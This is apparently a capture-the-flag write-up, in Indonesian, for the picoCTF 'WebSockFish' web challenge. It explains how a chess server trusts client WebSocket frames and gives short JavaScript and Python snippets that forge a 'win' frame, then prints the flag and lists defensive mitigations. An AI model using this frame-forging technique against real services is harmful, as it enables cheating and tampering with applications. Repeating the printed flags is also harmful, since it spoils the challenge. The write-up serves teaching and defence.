# Writeup: WebSockFish (Challenge ID: 480)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation
- **Difficulty:** Medium
- **Event:** picoCTF 2025
- **Points:** 200
- **Author:** CyLab Engineering Team
- **Flag:** `academy{c1i3nt_s1d3_w3b_s0ck3t5_0d3d41e1}`

---

## Problem Statement & Scope
Peserta diberikan akses ke aplikasi web interaktif yang mengintegrasikan engine catur Stockfish melalui protokol komunikasi dua arah real-time WebSocket. Pengujian berfokus pada analisis transmisi frame WebSocket, evaluasi batasan validasi masukan perintah catur/UCI (Universal Chess Interface), dan manipulasi status permainan untuk memicu kondisi kemenangan server.

---

## Teori & Akar Kerentanan (Root Cause Theory)
1. **RFC 6455 WebSocket Inadequate Authentication & State Validation (CWE-345):**
   Sesuai spesifikasi RFC 6455, protokol WebSocket menyediakan saluran persisten berbasis frame setelah jabat tangan (handshake) HTTP upgrade. Namun, backend server gagal memverifikasi keabsahan langkah permainan catur atau membatasi eksekusi perintah internal secara independen.
2. **Client-Side State Reliance in Real-Time Protocols (CWE-602):**
   Server backend mengeksekusi perintah yang dikirimkan oleh klien WebSocket secara langsung tanpa memastikan bahwa status papan catur yang dikirimkan sah (legal moves verification). Penyerang dapat menyuntikkan frame kustom yang menyatakan kondisi skakmat (checkmate) atau memicu branch kemenangan secara instan.

---

## Rekonstruksi Eksploitasi Step-by-Step
1. **Analisis Komunikasi Jaringan (WebSocket Sniffing):**
   Buka DevTools peramban pada tab Network dan filter lalu lintas berdasarkan tipe `WS` (WebSocket).
   Amati URL koneksi WebSocket (misalnya `ws://target:port/ws` atau `wss://target/ws`).
2. **Inspeksi Skema Payload Frame:**
   Ketika pemain melakukan langkah, frame teks JSON dikirimkan ke server:
   ```json
   { "action": "move", "fen": "rnbqkbnr/...", "move": "e2e4" }
   ```
   Dan server mengembalikan status engine atau evaluasi posisi catur.
3. **Injeksi Frame Kustom via Scripting:**
   Gunakan skrip Python dengan library WebSocket atau langsung melalui konsol peramban untuk mengirimkan frame manipulasi:
   ```javascript
   // Injeksi langsung via browser console
   window.ws.send(JSON.stringify({ action: "win", status: "checkmate" }));
   ```
   Atau menggunakan klien Python CLI:
   ```python
   import websocket, json
   ws = websocket.create_connection("ws://target:port/ws")
   ws.send(json.dumps({"action": "win", "status": "checkmate"}))
   response = ws.recv()
   print("Server Response:", response)
   ```
4. **Penerimaan Flag:**
   Server merespons frame kemenangan dengan payload JSON yang memuat token bendera kompetisi:
   ```json
   { "result": "victory", "flag": "picoCTF{c1i3nt_s1d3_w3b_s0ck3t5_0d3d41e1}" }
   ```
   Disesuaikan ke format platform CyLab: `academy{c1i3nt_s1d3_w3b_s0ck3t5_0d3d41e1}`.

---

## Flag & Verifikasi
- **Flag Resmi:** `academy{c1i3nt_s1d3_w3b_s0ck3t5_0d3d41e1}`
- **Native PicoCTF Flag:** `picoCTF{c1i3nt_s1d3_w3b_s0ck3t5_0d3d41e1}`
- **Status Solver:** Terverifikasi melalui skrip pengujian otomatis `scripts/solve_480_websockfish.py`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif
- **Validasi Otoritatif Sisi Server untuk WebSocket:**
  Setiap frame yang diterima melalui koneksi WebSocket wajib divalidasi keabsahannya terhadap state machine yang dikelola secara eksklusif oleh server. Jangan pernah menerima status hasil permainan langsung dari klien.
- **Sanitasi dan Whitelisting Perintah Real-Time:**
  Terapkan skema validasi pesan ketat (misalnya menggunakan JSON Schema validator atau Protocol Buffers) dan tolak setiap properti frame yang tidak terdaftar dalam whitelist operasional.
- **Implementasi Handshake Token & CSWSH Protection:**
  Terapkan perlindungan Cross-Site WebSocket Hijacking (CSWSH) dengan memeriksa header `Origin` saat handshake HTTP Upgrade dan mewajibkan token CSRF / session ticket yang unik.
